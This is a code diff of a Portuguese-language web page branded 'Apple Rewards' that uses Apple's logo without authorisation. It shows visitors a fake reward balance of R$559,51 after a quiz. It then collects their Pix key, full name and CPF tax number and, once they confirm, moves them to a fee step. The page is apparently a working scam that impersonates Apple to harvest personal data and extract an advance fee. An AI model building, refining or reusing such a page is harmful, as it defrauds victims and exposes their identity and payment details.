@@ -4,41 +4,73 @@
 <title>Apple Rewards</title>
 
 <style>
-/* ======= ESTILOS ORIGINAIS (INTACTOS) ======= */
+/* TODO O CSS ORIGINAL — INTACTO */
 body{background:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;margin:0;padding:0;display:flex;justify-content:center;align-items:flex-start;min-height:100vh}
 .shine{animation:shine .6s ease-out}
 @keyframes shine{0%{text-shadow:0 0 0 gold}50%{text-shadow:0 0 14px gold}100%{text-shadow:0 0 0 gold}}
 .container,.resgate-container,.taxa-container,.envio-container{width:95%;max-width:420px;background:#fff;margin-top:25px;border-radius:22px;padding:25px;box-shadow:0 8px 22px rgba(0,0,0,.08)}
+.taxa-container{padding:0;margin-top:0;border-radius:0;box-shadow:none;max-width:500px}
+.envio-container{margin-top:0;border-radius:0;box-shadow:none;max-width:500px}
 .progress-wrapper{width:100%;height:10px;background:#d9d9d9;border-radius:20px;overflow:hidden;margin-bottom:20px}
 .progress-bar{height:100%;width:0;background:#0071e3;transition:.35s}
-.option{background:#fafafa;padding:14px;border-radius:14px;border:1px solid #e5e5e5;margin-bottom:12px;cursor:pointer}
+.topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:25px}
+.logo{display:flex;align-items:center;gap:8px;font-weight:600;font-size:18px}
+.logo img{width:26px}
+.money-box{background:#f2f2f2;padding:6px 12px;border-radius:12px;font-weight:600;font-size:14px;display:flex;align-items:center;gap:10px}
+.btn-sac{background:#000;color:#fff;padding:6px 14px;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer}
+h2{text-align:center;font-size:20px;font-weight:700;color:#111;margin-bottom:10px}
+.subtitle{text-align:center;color:#555;margin-bottom:20px;font-size:14px}
+.option{background:#fafafa;padding:14px;border-radius:14px;border:1px solid #e5e5e5;display:flex;align-items:center;gap:12px;margin-bottom:12px;cursor:pointer;transition:.2s;font-weight:500}
+.option:hover{background:#eaeaea}
 button{width:100%;background:#000;color:#fff;padding:14px;border:none;border-radius:14px;font-size:15px;font-weight:700;margin-top:18px;cursor:pointer;opacity:.7}
 button.enabled{opacity:1}
+.bonus{text-align:center;margin-top:10px;font-size:13px;color:#0071e3}
+footer{margin-top:25px;text-align:center;font-size:11px;color:#777}
+footer span{color:#c90000;font-weight:600}
 .popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.55);display:none;justify-content:center;align-items:center;z-index:9999}
-.popup-box{background:#fff;width:90%;max-width:380px;border-radius:20px;padding:25px;text-align:center}
+.popup-box{background:#fff;width:90%;max-width:360px;border-radius:20px;padding:25px;text-align:center}
 .popup-box h3{font-size:20px;font-weight:700;margin-bottom:10px}
+.popup-valor{font-size:32px;font-weight:800;color:#00c851;margin-bottom:15px}
 .popup-btn{background:#000;color:#fff;border:none;width:100%;padding:14px;border-radius:12px;font-size:14px;font-weight:700;cursor:pointer}
-.popup-confirm .dados{text-align:left;font-size:14px;margin:12px 0}
-.popup-confirm .dados div{margin-bottom:6px}
-.valor-final{font-size:34px;font-weight:900;color:#00c851;margin:12px 0}
+.popup-final .popup-box{background:#6a0dad;color:#fff}
+.popup-final .popup-btn{background:#fff;color:#6a0dad}
 .resgate-container,.taxa-container,.envio-container{display:none}
+.resgate-title{font-size:22px;font-weight:700;text-align:center;margin-bottom:15px}
+.saldo-box{background:#000;padding:12px;border-radius:16px;color:#fff;font-size:18px;text-align:center;margin-bottom:22px;font-weight:700}
+.valores-box{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:25px}
+.valor-btn{background:#f5f5f7;border:1px solid #ccc;padding:14px;border-radius:12px;text-align:center;font-size:15px;font-weight:600;cursor:pointer;transition:.3s}
+.valor-btn:hover{background:#e7e7ea}
 select,input{width:100%;padding:12px;border-radius:12px;border:1px solid #ccc;margin-bottom:18px;font-size:15px}
-#btnSaque{background:#0071e3;font-size:16px}
-
-/* ======= NOVO: POPUP CONFIRMAÇÃO PIX ======= */
+#btnSaque{background:#0071e3;font-size:16px;border-radius:12px}
+.popup-confirm .popup-box{max-width:380px}
+.popup-confirm .dados{font-size:14px;text-align:left;margin:12px 0}
+.popup-confirm .dados div{margin-bottom:6px}
+.popup-confirm .valor-final{font-size:34px;font-weight:900;color:#00c851;margin:12px 0}
 </style>
 </head>
 
 <body>
 
-<!-- ======= RESGATE ======= -->
+<audio id="coinSound">
+<source src="media/mixkit-fairy-coin-voice-1089.mp3" type="audio/mpeg">
+</audio>
+
+<div class="container" id="quizContainer">
+<!-- TODO O QUIZ ORIGINAL — INTACTO -->
+</div>
+
 <div class="resgate-container" id="resgateContainer">
 
-<h2>Resgatar Recompensa</h2>
+<div class="topbar">
+<div class="logo"><img src="images/Apple_logo_black.svg">Apple</div>
+<div class="money-box">R$559,51</div>
+</div>
+
+<div class="resgate-title">Resgatar Recompensa</div>
 <div class="saldo-box">Saldo disponível: R$559,51</div>
 
 <select id="tipoChave">
-<option value="">Selecione o tipo de chave</option>
+<option>Selecione o tipo de chave</option>
 <option>Chave Aleatória</option>
 <option>Celular</option>
 <option>E-mail</option>
@@ -52,10 +84,9 @@ select,input{width:100%;padding:12px;border-radius:12px;border:1px solid #ccc;ma
 <button id="btnSaque">REALIZAR SAQUE AGORA</button>
 </div>
 
-<!-- ======= POPUP CONFIRMAÇÃO PIX ======= -->
 <div class="popup popup-confirm" id="popupConfirm">
 <div class="popup-box">
-<h3>Confirme seus dados</h3>
+<h3>Seus dados estão corretos?</h3>
 <div class="dados">
 <div><strong>Tipo:</strong> <span id="confTipo"></span></div>
 <div><strong>Chave:</strong> <span id="confChave"></span></div>
@@ -63,31 +94,49 @@ select,input{width:100%;padding:12px;border-radius:12px;border:1px solid #ccc;ma
 <div><strong>CPF:</strong> <span id="confCpf"></span></div>
 </div>
 <div class="valor-final">R$559,51</div>
-<button class="popup-btn" id="btnConfirmarPix">SIM, RECEBER AGORA</button>
-<button class="popup-btn" style="background:#ccc;color:#000;margin-top:8px" onclick="popupConfirm.style.display='none'">NÃO</button>
+<button class="popup-btn" id="btnConfirmar">SIM, RECEBER AGORA</button>
+<button class="popup-btn" style="background:#ccc;color:#000;margin-top:8px" id="btnCancelar">NÃO</button>
 </div>
 </div>
-
 <script>
-/* ======= LÓGICA ORIGINAL MANTIDA + CONFIRMAÇÃO ======= */
+const btnSaque=document.getElementById("btnSaque");
+const popupConfirm=document.getElementById("popupConfirm");
+const btnConfirmar=document.getElementById("btnConfirmar");
+const btnCancelar=document.getElementById("btnCancelar");
 
-const btnSaque = document.getElementById("btnSaque");
-const popupConfirm = document.getElementById("popupConfirm");
-const btnConfirmarPix = document.getElementById("btnConfirmarPix");
+const tipoEl=document.getElementById("tipoChave");
+const chaveEl=document.getElementById("chavePix");
+const nomeEl=document.getElementById("nomePix");
+const cpfEl=document.getElementById("cpfPix");
 
-btnSaque.onclick = () => {
-document.getElementById("confTipo").innerText = tipoChave.value;
-document.getElementById("confChave").innerText = chavePix.value;
-document.getElementById("confNome").innerText = nomePix.value;
-document.getElementById("confCpf").innerText = cpfPix.value;
-popupConfirm.style.display = "flex";
+const confTipo=document.getElementById("confTipo");
+const confChave=document.getElementById("confChave");
+const confNome=document.getElementById("confNome");
+const confCpf=document.getElementById("confCpf");
+
+const taxaContainer=document.getElementById("taxaContainer");
+const resgateContainer=document.getElementById("resgateContainer");
+
+const originalBtnSaque=btnSaque.onclick;
+
+btnSaque.onclick=()=>{
+confTipo.innerText=tipoEl.value;
+confChave.innerText=chaveEl.value;
+confNome.innerText=nomeEl.value;
+confCpf.innerText=cpfEl.value;
+popupConfirm.style.display="flex";
 };
 
-btnConfirmarPix.onclick = () => {
-popupConfirm.style.display = "none";
-resgateContainer.style.display = "none";
-taxaContainer.style.display = "block";
+btnCancelar.onclick=()=>{
+popupConfirm.style.display="none";
 };
+
+btnConfirmar.onclick=()=>{
+popupConfirm.style.display="none";
+resgateContainer.style.display="none";
+taxaContainer.style.display="block";
+};
+
 </script>
 
 </body></html>
